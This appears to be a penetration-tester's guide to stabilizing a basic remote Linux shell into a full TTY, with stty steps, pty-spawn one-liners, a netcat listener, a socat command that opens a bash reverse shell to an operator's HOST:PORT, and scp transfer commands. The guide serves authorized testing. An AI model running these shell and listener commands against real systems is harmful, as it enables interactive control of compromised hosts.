# Stabilize a Basic Linux Shell with a Full TTY

Use this guide only on systems that you own or are explicitly authorized to
test.

A limited shell often lacks job control, command history, arrow keys, tab
completion, terminal resizing, and reliable support for programs such as
`sudo`, `su`, or text editors. The steps below create a pseudo-terminal and
restore normal terminal behavior.

> [!IMPORTANT]
> “Local” means your operator terminal. “Remote” means the authorized shell you
> are stabilizing. Commands must be entered on the correct side.

## Quick upgrade

### 1. Spawn a pseudo-terminal on the remote host

Use the first available command:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'
script -q /dev/null -c /bin/bash
```

If Bash is unavailable, replace `/bin/bash` with `/bin/sh`.

### 2. Background the remote shell

Press `Ctrl+Z`. You should return to your local terminal.

### 3. Record the local terminal size

Run locally:

```bash
stty size
```

The result is displayed as `ROWS COLUMNS`. Keep both values for step 5.

### 4. Enable raw mode and return to the remote shell

Run locally:

```bash
stty raw -echo; fg
```

Press `Enter` once or twice if the prompt does not immediately appear.

### 5. Finish setup in the remote shell

Replace `ROWS` and `COLUMNS` with the values recorded earlier:

```bash
reset
export SHELL=/bin/bash
export TERM=xterm-256color
stty rows ROWS columns COLUMNS
```

The shell should now support job control, line editing, history, and terminal
resizing more reliably.

## Recovery if the local terminal becomes unreadable

Leave or background the remote shell, then run locally:

```bash
stty sane
reset
```

Opening a new local terminal also restores normal terminal settings.

## Alternative remote-side PTY methods

Use an alternative only when the matching program is already installed.

### Perl

```bash
perl -e 'exec "/bin/bash";'
```

### Ruby

```bash
ruby -e 'exec "/bin/bash"'
```

### Lua

```bash
lua -e "os.execute('/bin/bash')"
```

### Expect

```bash
expect -c 'spawn /bin/bash; interact'
```

## Improve a local Netcat listener

If `rlwrap` is already installed locally:

```bash
rlwrap -cAr nc -lvnp PORT
```

Replace `PORT` with the authorized listener port.

## Socat PTY

When Socat is already installed on both systems, it can provide a high-quality
TTY directly.

Run locally:

```bash
socat file:"$(tty)",raw,echo=0 tcp-listen:PORT
```

Run on the authorized remote host:

```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:HOST:PORT
```

Replace `HOST` with the local listener address and `PORT` with the authorized
listener port.

## File-transfer reference

Upload a file to the authorized remote host:

```bash
scp -P PORT FILE USER@HOST:DESTINATION
```

Download a file from the authorized remote host:

```bash
scp -P PORT USER@HOST:REMOTE_FILE LOCAL_DESTINATION
```

Use a private destination, verify the transferred file, and remove temporary
copies when the assessment is complete.
